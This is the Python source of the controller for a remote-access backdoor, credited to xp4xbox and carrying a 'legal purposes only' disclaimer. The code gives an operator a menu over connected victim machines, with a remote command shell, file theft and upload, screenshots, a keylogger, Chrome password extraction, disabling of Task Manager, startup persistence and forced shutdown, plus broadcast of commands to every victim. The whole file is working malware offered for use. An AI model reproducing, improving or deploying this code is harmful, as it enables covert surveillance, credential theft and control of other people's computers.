'''
Python backdoor by xp4xbox
https://github.com/xp4xbox/Python-Backdoor
https://www.instructables.com/id/Simple-Python-Backdoor/

License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license

NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
'''

import socket, os, time, threading, sys
from queue import Queue

intThreads = 2
arrJobs = [1, 2]
queue = Queue()

arrAddresses = []
arrConnections = []

strHost = "0.0.0.0"
intPort = 3000

# function to return decoded utf-8
decode_utf8 = lambda data: data.decode("utf-8")

# function to return string with quotes removed
remove_quotes = lambda string: string.replace("\"", "")

# function to return title centered around string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while True:
        bytPart = conn.recv(buffer)
        if len(bytPart) == buffer:
            return bytPart
        bytData += bytPart
        if len(bytData) == buffer:
            return bytData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print("Error creating socket " + str(strError))


def socket_bind():
    global objSocket
    try:
        print("Listening on port " + str(intPort))
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print("Error binding socket " + str(strError) + " Retrying...")
        socket_bind()


def socket_accept():
    global blnFirstRun, arrAddresses
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            arrConnections.append(conn)  # append connection to array
            client_info = decode_utf8(conn.recv(1024)).split("`,")
            address += client_info[0], client_info[1], client_info[2],
            arrAddresses.append(address)
            print("\n" + "Connection has been established: {0} ({1})".format(address[0], address[2]))
        except socket.error:
            print("Error accepting connections!")
            continue


def menu_help():
    print("\n" + "--help")
    print("--l List all connections")
    print("--i Interact with connection")
    print("--e Open remote cmd with connection")
    print("--s Send command to every connection")
    print("--c Close connection")
    print("--x Exit and close all connections")


def main_menu():
    while True:
        strChoice = input("\n" + ">> ")

        refresh_connections()  # refresh connection list

        if strChoice == "--l":
            list_connections()

        elif strChoice[:3] == "--i" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "True")
            if conn is not None:
                send_commands()
        elif strChoice == "--help":
            menu_help()

        elif strChoice[:3] == "--c" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                conn.send(str.encode("exit"))
                conn.close()

        elif strChoice == "--x":
            close()
            break  # break to continue work() function

        elif strChoice[:3] == "--e" and len(strChoice) > 3:
            conn = select_connection(strChoice[4:], "False")
            if conn is not None:
                command_shell()

        elif strChoice[:3] == "--s" and len(strChoice) > 3:
            send_command_all(strChoice[4:])
        else:
            print("Invalid choice, please try again!")
            menu_help()


def close():
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:  # if there are no computers connected
        return

    for intCounter, conn in enumerate(arrConnections):
        conn.send(str.encode("exit"))
        conn.close()
    del arrConnections; arrConnections = []
    del arrAddresses; arrAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arrConnections, arrAddresses
    for intCounter, conn in enumerate(arrConnections):
        try:
            conn.send(str.encode("test"))  # test to see if connection is active
        except socket.error:
            del arrAddresses[intCounter]
            del arrConnections[intCounter]
            conn.close()


def list_connections():
    refresh_connections()

    if len(arrConnections) > 0:
        strClients = ""

        for intCounter, conn in enumerate(arrConnections):

            strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
                        str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                        str(arrAddresses[intCounter][3]) + "\n"

        print("\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " +
            center(str(arrAddresses[0][1]), "Port") + 4*" " +
            center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
            center(str(arrAddresses[0][3]), "OS") + "\n" + strClients, end="")
    else:
        print("No connections.")


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print("Invalid choice, please try again!")
        return
    else:
        '''
        IP, PC Name, OS, User
        '''
        arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), \
                                                              str(arrAddresses[connection_id][3]), \
                                                              str(arrAddresses[connection_id][4])

        if blnGetResponse == "True":
            print("You are connected to " + arrInfo[0] + " ...." + "\n")
        return conn


def send_command_all(command):
    if os.path.isfile("command_log.txt"):
        open("command_log.txt", "w").close()  # clear previous log contents

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, "False")

        if conn is not None and command != "cmd":
            send_command(command)


def user_info():
    print("IP: " + arrInfo[0])
    print("PC Name: " + arrInfo[1])
    print("OS: " + arrInfo[2])
    print("User: " + arrInfo[3])


def screenshot():
    conn.send(str.encode("screen"))
    strClientResponse = decode_utf8(conn.recv(1024))  # get info
    print("\n" + strClientResponse)

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")

    ScrnData = recvall(intBuffer)  # get data and write it
    objPic = open(strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")


def browse_files():
    conn.send(str.encode("filebrowser"))
    print("\n" + "Drives :")

    strDrives = decode_utf8(conn.recv(1024))
    print(strDrives + "\n")

    strDir = input("Directory: ")

    if strDir == "":
        # tell the client of the invalid directory
        strDir = "Invalid"

    conn.send(str.encode(strDir))

    strClientResponse = decode_utf8(conn.recv(1024))  # get buffer size

    if strClientResponse == "Invalid Directory!":  # if the directory is invalid
        print("\n" + strClientResponse)
        return

    intBuffer = int(strClientResponse)
    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data

    print("\n" + strClientResponse)


def startup():
    conn.send(str.encode("startup"))
    print("Registering ...")

    strClientResponse = decode_utf8(conn.recv(1024))
    if not strClientResponse == "success":
        print(strClientResponse)


def send_file():
    strFile = remove_quotes(input("\n" + "File to send: "))
    if not os.path.isfile(strFile):
        print("Invalid File!")
        return

    strOutputFile = remove_quotes(input("\n" + "Output File: "))
    if strOutputFile == "":  # if the input is blank
        return

    conn.send(str.encode("send" + str(os.path.getsize(strFile))))

    objFile = open(strFile, "rb")  # send file contents and close the file
    time.sleep(1)
    conn.send(objFile.read())
    objFile.close()

    conn.send(str.encode(strOutputFile))

    print("Total bytes sent: " + str(os.path.getsize(strFile)))

    strClientResponse = decode_utf8(conn.recv(1024))
    print(strClientResponse)


def receive():
    strFile = remove_quotes(input("\n" + "Target file: "))
    strFileOutput = remove_quotes(input("\n" + "Output File: "))

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    conn.send(str.encode("recv" + strFile))
    strClientResponse = decode_utf8(conn.recv(1024))

    print(strClientResponse)

    if strClientResponse == "Target file not found!":
        return

    intBuffer = ""
    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
        if strClientResponse[intCounter].isdigit():
            intBuffer += strClientResponse[intCounter]
    intBuffer = int(intBuffer)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        objFile = open(strFileOutput, "wb")
        objFile.write(file_data)
        objFile.close()
    except:
        print("Path is protected/invalid!")
        return

    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")


def command_shell():  # remote cmd shell
    conn.send(str.encode("cmd"))
    strDefault = "\n" + decode_utf8(conn.recv(1024)) + ">"
    print(strDefault, end="")  # print default prompt

    while True:
        strCommand = input()
        if strCommand == "quit" or strCommand == "exit":
            conn.send(str.encode("goback"))
            break

        elif strCommand == "cmd":  # commands that do not work
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            conn.send(str.encode(strCommand))
            intBuffer = int(decode_utf8(conn.recv(1024)))  # receive buffer size
            strClientResponse = decode_utf8(recvall(intBuffer))
            print(strClientResponse, end="")  # print cmd output
        else:
            print(strDefault, end="")


def disable_taskmgr():
    conn.send(str.encode("dtaskmgr"))
    print(decode_utf8(conn.recv(1024)))  # print response


def chrpass():  # legal purposes only!
    conn.send(str.encode("chrpass"))
    strClientResponse = decode_utf8(conn.recv(1024))

    if strClientResponse == "noexist":
        print("Google Chrome is not installed on target.")
        return

    if strClientResponse == "error":
        strClose = input("Browser is currently in use. Would you like to close it? y/n ")
        if strClose == "y":
            conn.send(str.encode("close"))
        else:
            conn.send(str.encode("stay"))
        return
    else:
        intBuffer = int(strClientResponse)

    print("\n" + decode_utf8(recvall(intBuffer)))  # print results


def keylogger(option):
    if option == "start":
        conn.send(str.encode("keystart"))
        if decode_utf8(conn.recv(1024)) == "error":
            print("Keylogger is already running.")

    elif option == "stop":
        conn.send(str.encode("keystop"))
        if decode_utf8(conn.recv(1024)) == "error":
            print("Keylogger is not running.")

    elif option == "dump":
        conn.send(str.encode("keydump"))
        intBuffer = decode_utf8(conn.recv(1024))

        if intBuffer == "error":
            print("Keylogger is not running.")
        elif intBuffer == "error2":
            print("No logs.")
        else:
            strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
            print("\n" + strLogs)


def send_command(command):
    conn.send(str.encode("runcmd" + command))
    intBuffer = int(decode_utf8(conn.recv(1024)))  # receive buffer size

    strClientResponse = "========================" + "\n" + arrInfo[0] + 4*" " + arrInfo[1] + \
                        decode_utf8(recvall(intBuffer)) + \
                        "========================"

    if os.path.isfile("command_log.txt"):
        objLogFile = open("command_log.txt", "a")
    else:
        objLogFile = open("command_log.txt", "w")

    objLogFile.write(strClientResponse + "\n" + "\n")
    objLogFile.close()


def show_help():
    print("--help")
    print("--m Send message")
    print("--o Open a website")
    print("--r Receive file from the user")
    print("--s Send file to the user")
    print("--p Take screenshot")
    print("--a Run at startup")
    print("--v View files")
    print("--u User Info")
    print("--e Open remote cmd")
    print("--d Disable task manager")
    print("--k (start) (stop) (dump) Keylogger")
    print("--x (1) Lock user")
    print("--x (2) Restart user")
    print("--x (3) Shutdown user")
    print("--b Move connection to background")
    print("--c Close connection")


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\n" + "Type selection: ")

            if strChoice == "--help":
                print("\n", end="")
                show_help()
            elif strChoice == "--c":
                conn.send(str.encode("exit"))
                conn.close()
                break
            elif strChoice[:3] == "--m" and len(strChoice) > 3:
                strMsg = "msg" + strChoice[4:]
                conn.send(str.encode(strMsg))
            elif strChoice[:3] == "--o" and len(strChoice) > 3:
                strSite = "site" + strChoice[4:]
                conn.send(str.encode(strSite))
            elif strChoice == "--a":
                startup()
            elif strChoice == "--u":
                user_info()
            elif strChoice == "--p":
                screenshot()
            elif strChoice == "--v":
                browse_files()
            elif strChoice == "--s":
                send_file()
            elif strChoice == "--r":
                receive()
            elif strChoice == "--x 1":
                conn.send(str.encode("lock"))
            elif strChoice == "--x 2":
                conn.send(str.encode("shutdown"))
                conn.close()
                break
            elif strChoice == "--x 3":
                conn.send(str.encode("restart"))
                conn.close()
                break
            elif strChoice == "--b":
                break
            elif strChoice == "--e":
                command_shell()
            elif strChoice == "--d":
                disable_taskmgr()
            elif strChoice == "--g":
                chrpass()
            elif strChoice == "--k start":
                keylogger("start")
            elif strChoice == "--k stop":
                keylogger("stop")
            elif strChoice == "--k dump":
                keylogger("dump")
            else:
                print("Invalid choice, please try again!")

    except socket.error as e:  # if there is a socket error
        print("Error, connection was lost! :" + "\n" + str(e))
        return


def create_threads():
    for _ in range(intThreads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in arrJobs:
        queue.put(intThread)  # put thread id into list
    queue.join()

create_threads()
create_jobs()
